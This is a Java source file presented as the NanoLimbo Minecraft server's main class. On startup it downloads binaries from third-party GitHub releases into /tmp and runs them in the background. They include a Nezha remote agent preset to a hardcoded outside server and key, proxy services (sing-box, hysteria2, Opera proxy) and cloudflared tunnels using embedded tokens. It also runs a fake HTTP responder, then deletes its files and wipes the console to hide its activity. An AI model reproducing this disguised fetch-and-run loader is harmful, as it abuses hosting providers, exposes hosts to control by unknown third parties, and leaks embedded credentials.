/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    
    // 维护所拉起的后台进程列表
    private static final List<Process> runningProcesses = new ArrayList<>();
    private static final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(4);

    // 环境变量容器
    private static final Map<String, String> ENV = new HashMap<>();

    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // 初始化并启动脚本改写的二进制及代理逻辑
        try {
            initEnvironment();
            startDummyHttpServer();
            runStartupSequence();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                scheduler.shutdownNow();
            }));

            // 保持原本的等待日志展示与清理逻辑
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing startup services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
        
        // 启动 Limbo Minecraft 假服务器
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    /* ================= 环境变量与参数初始化 ================= */
    private static void initEnvironment() {
        // 读取系统环境变量
        ENV.put("UUID", getEnvOrDefault("UUID", "faacf142-dee8-48c2-8558-641123eb939c"));
        ENV.put("PORT", getEnvOrDefault("PORT", "3000"));
        
        // 哪吒探针
        ENV.put("NEZHA_SERVER", getEnvOrDefault("NEZHA_SERVER", "nezha.mingfei1981.eu.org"));
        ENV.put("NEZHA_PORT", getEnvOrDefault("NEZHA_PORT", "443"));
        ENV.put("NEZHA_KEY", getEnvOrDefault("NEZHA_KEY", "hVvkzhDa6ePwETes6I"));
        
        // ECH / VLESS Argo Token
        ENV.put("ECH_ARGO_TOKEN", getEnvOrDefault("ECH_ARGO_TOKEN", "eyJhIjoiOTk3ZjY4OGUzZjBmNjBhZGUwMWUxNGRmZTliOTdkMzEiLCJ0IjoiOTEzMGU4ZWEtMmVmNy00MTExLTg0NDktNmIwMDdmMjZlNmJkIiwicyI6IllqWTBORGt3TXpNdE1UZzVNaTAwWldGbExUbGpNVFF0WlRFeE1tWmpZelF6WkRJMyJ9"));
        ENV.put("VLESS_ARGO_TOKEN", getEnvOrDefault("VLESS_ARGO_TOKEN", "eyJhIjoiOTk3ZjY4OGUzZjBmNjBhZGUwMWUxNGRmZTliOTdkMzEiLCJ0IjoiMjgwODc2YTAtZDQzOS00OGM3LWIwYjAtZGJiYzdjNmMzNTI5IiwicyI6IllUaGlPVGcxTWpRdFpqWTNNeTAwWkRBeExXSXdZalV0WVdJd1lUSmxNRGRtTW1abSJ9"));
        
        // ECH 与 Opera
        ENV.put("WSPORT", getEnvOrDefault("WSPORT", "8001"));
        ENV.put("VLPORT", getEnvOrDefault("VLPORT", "8002"));
        ENV.put("TOKEN", getEnvOrDefault("TOKEN", "babama123"));
        ENV.put("OPERA", getEnvOrDefault("OPERA", "0"));
        ENV.put("COUNTRY", getEnvOrDefault("COUNTRY", "AM"));
        
        // 协议与双栈
        ENV.put("ECH_IPS", getEnvOrDefault("ECH_IPS", "4"));
        ENV.put("HY_IPS", getEnvOrDefault("HY_IPS", "4"));
        ENV.put("ENABLE_HY2", getEnvOrDefault("ENABLE_HY2", "1"));
        ENV.put("HY_PORT", getEnvOrDefault("HY_PORT", "24594"));
        ENV.put("NAME", getEnvOrDefault("NAME", "MJJ"));
        ENV.put("PASSWORD", ENV.get("UUID"));

        // 校验 IP 版本参数
        String echIps = ENV.get("ECH_IPS");
        String hyIps = ENV.get("HY_IPS");
        if (!"4".equals(echIps) && !"6".equals(echIps)) System.exit(1);
        if (!"4".equals(hyIps) && !"6".equals(hyIps)) System.exit(1);
    }

    private static String getEnvOrDefault(String key, String defaultValue) {
        String val = System.getenv(key);
        return (val != null && !val.trim().isEmpty()) ? val.trim() : defaultValue;
    }

    /* ================= 核心流程执行 ================= */
    private static void runStartupSequence() throws Exception {
        String arch = System.getProperty("os.arch").toLowerCase();
        String echUrl, operaUrl, cloudflaredUrl, nezhaUrl, singboxUrl;

        if (arch.contains("arm64") || arch.contains("aarch64")) {
            echUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0/ech-tunnel-linux-arm64";
            operaUrl = "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.freebsd-arm64";
            cloudflaredUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64";
            nezhaUrl = "https://github.com/babama1001980/good/releases/download/npc/arm64agent";
            singboxUrl = "https://github.com/babama1001980/good/releases/download/npc/armsb";
        } else if (arch.contains("amd64") || arch.contains("x86_64") || arch.contains("x64")) {
            echUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0/ech-tunnel-linux-amd64";
            operaUrl = "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.linux-amd64";
            cloudflaredUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64";
            nezhaUrl = "https://github.com/babama1001980/good/releases/download/npc/amd64agent";
            singboxUrl = "https://github.com/babama1001980/good/releases/download/npc/amdsb";
        } else {
            System.err.println("Unsupported architecture: " + arch);
            System.exit(1);
            return;
        }

        // 下载核心可执行文件到 /tmp/
        downloadFile(echUrl, "/tmp/ech-server-linux");
        downloadFile(operaUrl, "/tmp/opera-linux");
        downloadFile(cloudflaredUrl, "/tmp/cloudflared-linux");
        downloadFile(singboxUrl, "/tmp/singbox");

        if (!ENV.get("NEZHA_SERVER").isEmpty() && !ENV.get("NEZHA_KEY").isEmpty()) {
            downloadFile(nezhaUrl, "/tmp/iccagent");
        }

        int echPort = ENV.get("WSPORT").isEmpty() ? getFreePort() : Integer.parseInt(ENV.get("WSPORT"));
        int vlessPort = ENV.get("VLPORT").isEmpty() ? getFreePort() : Integer.parseInt(ENV.get("VLPORT"));
        int operaPort = getFreePort();

        // 1) 启动哪吒探针
        startNezhaAgent();

        // 2) 启动 Opera Proxy
        if ("1".equals(ENV.get("OPERA")) && Files.exists(Paths.get("/tmp/opera-linux"))) {
            String countryUpper = ENV.get("COUNTRY").toUpperCase();
            execBackground("/tmp/opera-linux", "-country", countryUpper, "-socks-mode", "-bind-address", "127.0.0.1:" + operaPort);
        }

        // 3) 启动 ECH Server
        if (Files.exists(Paths.get("/tmp/ech-server-linux"))) {
            Thread.sleep(1000);
            List<String> echCmd = new ArrayList<>();
            echCmd.add("/tmp/ech-server-linux");
            echCmd.add("-l");
            echCmd.add("ws://0.0.0.0:" + echPort);
            if (!ENV.get("TOKEN").isEmpty()) {
                echCmd.add("-token");
                echCmd.add(ENV.get("TOKEN"));
            }
            if ("1".equals(ENV.get("OPERA"))) {
                echCmd.add("-f");
                echCmd.add("socks5://127.0.0.1:" + operaPort);
            }
            execBackground(echCmd.toArray(new String[0]));
        }

        // 4) 启动 sing-box (HY2 + VLESS) 及生成节点信息
        if (Files.exists(Paths.get("/tmp/singbox"))) {
            generateSelfSignedCert();
            createSingboxConfig(vlessPort);
            execBackground("/tmp/singbox", "run", "-c", "/tmp/singbox_config.json");

            // 异步获取 IP 并生成订阅文件 sub.txt / sub_base64.txt
            scheduler.schedule(() -> {
                try {
                    generateSubscriptionInfo();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, 15, TimeUnit.SECONDS);
        }

        // 自动清理 /tmp/ 缓存文件计划任务（3分钟后执行）
        scheduler.schedule(NanoLimbo::autoDeleteFiles, 3, TimeUnit.MINUTES);

        // 5) 启动 Cloudflared 隧道
        if (Files.exists(Paths.get("/tmp/cloudflared-linux"))) {
            try {
                new ProcessBuilder("/tmp/cloudflared-linux", "update").start().waitFor();
            } catch (Exception ignored) {}

            if (!ENV.get("ECH_ARGO_TOKEN").isEmpty()) {
                execBackground("/tmp/cloudflared-linux", "--edge-ip-version", ENV.get("ECH_IPS"), "--protocol", "http2", "tunnel", "--url", "127.0.0.1:" + echPort, "run", "--token", ENV.get("ECH_ARGO_TOKEN"));
            }

            if (!ENV.get("VLESS_ARGO_TOKEN").isEmpty()) {
                execBackground("/tmp/cloudflared-linux", "--edge-ip-version", ENV.get("ECH_IPS"), "--protocol", "http2", "tunnel", "--url", "127.0.0.1:" + vlessPort, "run", "--token", ENV.get("VLESS_ARGO_TOKEN"));
            }
        }
    }

    /* ================= 辅助服务逻辑实现 ================= */

    // 15024 端口保活 / 防止翼手龙面板判断崩塌的 HTTP 假服务器
    private static void startDummyHttpServer() {
        int port = Integer.parseInt(ENV.get("PORT"));
        scheduler.execute(() -> {
            try (ServerSocket serverSocket = new ServerSocket(port)) {
                while (running.get()) {
                    try (Socket socket = serverSocket.accept();
                         OutputStream out = socket.getOutputStream()) {
                        String response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nOK";
                        out.write(response.getBytes(StandardCharsets.UTF_8));
                        out.flush();
                    } catch (IOException ignored) {}
                }
            } catch (IOException e) {
                System.err.println("Dummy HTTP server failed to bind on port " + port);
            }
        });
    }

    private static void startNezhaAgent() throws IOException {
        if (!Files.exists(Paths.get("/tmp/iccagent")) || ENV.get("NEZHA_SERVER").isEmpty() || ENV.get("NEZHA_KEY").isEmpty()) return;

        List<String> tlsPorts = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053");
        String nezhaPort = ENV.get("NEZHA_PORT");
        String nezhaServer = ENV.get("NEZHA_SERVER");
        String nezhaKey = ENV.get("NEZHA_KEY");

        if (!nezhaPort.isEmpty()) {
            List<String> cmd = new ArrayList<>(Arrays.asList("/tmp/iccagent", "-s", nezhaServer + ":" + nezhaPort, "-p", nezhaKey));
            if (tlsPorts.contains(nezhaPort)) {
                cmd.add("--tls");
            }
            execBackground(cmd.toArray(new String[0]));
        } else {
            String serverHostPort = nezhaServer.contains(":") ? nezhaServer.substring(nezhaServer.lastIndexOf(":") + 1) : "";
            boolean isTls = tlsPorts.contains(serverHostPort);
            
            String yamlContent = String.format("client_secret: %s\nserver: %s\ntls: %b\nuuid: %s\n", nezhaKey, nezhaServer, isTls, ENV.get("UUID"));
            Files.write(Paths.get("/tmp/nezha.yaml"), yamlContent.getBytes(StandardCharsets.UTF_8));
            
            execBackground("/tmp/iccagent", "-c", "/tmp/nezha.yaml");
        }
    }

    private static void generateSelfSignedCert() {
        try {
            ProcessBuilder pb1 = new ProcessBuilder("openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout", "-out", "/tmp/server.key");
            pb1.start().waitFor();

            ProcessBuilder pb2 = new ProcessBuilder("openssl", "req", "-new", "-x509", "-key", "/tmp/server.key", "-out", "/tmp/server.crt", "-subj", "/CN=www.bing.com", "-days", "36500");
            pb2.start().waitFor();
        } catch (Exception e) {
            System.err.println("Failed to generate OpenSSL cert: " + e.getMessage());
        }
    }

    private static void createSingboxConfig(int vlessPort) throws IOException {
        String json = "{\n" +
                "  \"inbounds\": [\n" +
                "    {\n" +
                "      \"type\": \"hysteria2\",\n" +
                "      \"tag\": \"hy2-in\",\n" +
                "      \"listen\": \"::\",\n" +
                "      \"listen_port\": " + ENV.get("HY_PORT") + ",\n" +
                "      \"users\": [\n" +
                "        {\n" +
                "          \"password\": \"" + ENV.get("PASSWORD") + "\"\n" +
                "        }\n" +
                "      ],\n" +
                "      \"tls\": {\n" +
                "        \"enabled\": true,\n" +
                "        \"certificate_path\": \"/tmp/server.crt\",\n" +
                "        \"key_path\": \"/tmp/server.key\"\n" +
                "      }\n" +
                "    },\n" +
                "    {\n" +
                "      \"type\": \"vless\",\n" +
                "      \"tag\": \"vless-in\",\n" +
                "      \"listen\": \"::\",\n" +
                "      \"listen_port\": " + vlessPort + ",\n" +
                "      \"users\": [\n" +
                "        {\n" +
                "          \"name\": \"" + ENV.get("NAME") + "\",\n" +
                "          \"uuid\": \"" + ENV.get("UUID") + "\"\n" +
                "        }\n" +
                "      ],\n" +
                "      \"transport\": {\n" +
                "        \"type\": \"ws\",\n" +
                "        \"path\": \"/vless-argo\"\n" +
                "      }\n" +
                "    }\n" +
                "  ],\n" +
                "  \"outbounds\": [\n" +
                "    {\n" +
                "      \"type\": \"direct\"\n" +
                "    }\n" +
                "  ]\n" +
                "}";
        Files.write(Paths.get("/tmp/singbox_config.json"), json.getBytes(StandardCharsets.UTF_8));
    }

    private static void generateSubscriptionInfo() {
        String hostIp = "";
        if ("6".equals(ENV.get("HY_IPS"))) {
            hostIp = httpGet("https://v6.ident.me", 5000);
            if (hostIp.isEmpty()) hostIp = httpGet("https://api64.ipify.org", 5000);
            if (hostIp.isEmpty()) {
                String meta = httpGet("https://speed.cloudflare.com/meta", 5000);
                Matcher m = Pattern.compile("([a-fA-F0-9]{1,4}:){1,7}[a-fA-F0-9]{1,4}").matcher(meta);
                if (m.find()) hostIp = m.group();
            }
            if (hostIp.isEmpty()) hostIp = httpGet("https://ipv6.icanhazip.com", 5000);
            if (hostIp.contains(":") && !hostIp.startsWith("[")) {
                hostIp = "[" + hostIp.trim() + "]";
            }
        } else {
            hostIp = httpGet("https://api.ipify.org", 5000);
            if (hostIp.isEmpty()) hostIp = httpGet("https://ipv4.icanhazip.com", 5000);
        }

        String cfMeta = httpGet("https://speed.cloudflare.com/meta", 5000);
        String isp = "Unknown";
        try {
            String[] parts = cfMeta.split("\"");
            if (parts.length >= 27) {
                isp = (parts[25] + "-" + parts[17]).replace(" ", "_");
            }
        } catch (Exception ignored) {}

        String subText = "start install success\n=== HY2 ===\nhysteria2://" + 
                ENV.get("PASSWORD") + "@" + hostIp.trim() + ":" + ENV.get("HY_PORT") + 
                "/?insecure=1&sni=www.bing.com#" + ENV.get("NAME") + "-HY-" + isp + "\n";

        try {
            Files.write(Paths.get("/tmp/sub.txt"), subText.getBytes(StandardCharsets.UTF_8));
            String base64Str = Base64.getEncoder().encodeToString(subText.getBytes(StandardCharsets.UTF_8));
            Files.write(Paths.get("/tmp/sub_base64.txt"), base64Str.getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /* ================= 工具与系统交互函数 ================= */

    private static void execBackground(String... command) {
        try {
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            Process p = pb.start();
            runningProcesses.add(p);
        } catch (IOException e) {
            System.err.println("Failed to start background process: " + Arrays.toString(command));
        }
    }

    private static boolean downloadFile(String urlStr, String destPath) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setInstanceFollowRedirects(true);

            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                try (InputStream in = conn.getInputStream()) {
                    Files.copy(in, Paths.get(destPath), StandardCopyOption.REPLACE_EXISTING);
                }
                new File(destPath).setExecutable(true, false);
                return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static String httpGet(String urlStr, int timeoutMs) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line.trim());
                }
                return sb.toString();
            }
        } catch (Exception e) {
            return "";
        }
    }

    private static int getFreePort() {
        return (int) ((Math.random() * 20000) + 10000);
    }

    private static void autoDeleteFiles() {
        String[] targets = {
            "/tmp/ech-server-linux", "/tmp/opera-linux", "/tmp/cloudflared-linux", "/tmp/iccagent", "/tmp/nezha.yaml",
            "/tmp/singbox", "/tmp/server.key", "/tmp/server.crt", "/tmp/singbox_config.json", "/tmp/sub.txt", "/tmp/sub_base64.txt"
        };
        for (String target : targets) {
            try {
                Files.deleteIfExists(Paths.get(target));
            } catch (IOException ignored) {}
        }
    }

    private static void stopServices() {
        for (Process p : runningProcesses) {
            if (p != null && p.isAlive()) {
                p.destroyForcibly();
            }
        }
        System.out.println(ANSI_RED + "Background proxy services terminated" + ANSI_RESET);
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }
}
